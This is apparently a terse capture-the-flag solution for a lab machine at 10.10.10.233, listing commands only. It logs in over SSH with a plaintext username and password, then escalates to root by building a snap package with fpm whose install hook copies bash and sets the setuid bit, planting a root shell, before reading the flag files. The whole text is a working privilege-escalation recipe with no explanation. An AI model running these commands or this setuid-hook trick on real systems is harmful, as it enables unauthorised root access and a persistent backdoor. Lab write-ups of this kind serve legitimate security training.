# Get User:
ssh brucetherealadmin@10.10.10.233<br>
password:booboo<br>
cat user.txt

# Get Root:
cd $(mktemp -d)<br>
mkdir -p meta/hooks<br>
printf '#!/bin/sh\ncp /bin/bash /home/brucetherealadmin/.w/rootbash && chmod +s /home/brucetherealadmin/.w/rootbash' > meta/hooks/install<br>
chmod +x meta/hooks/install<br>
fpm -n waza -s dir -t snap -a all meta<br>
cat /root/root.txt<br>

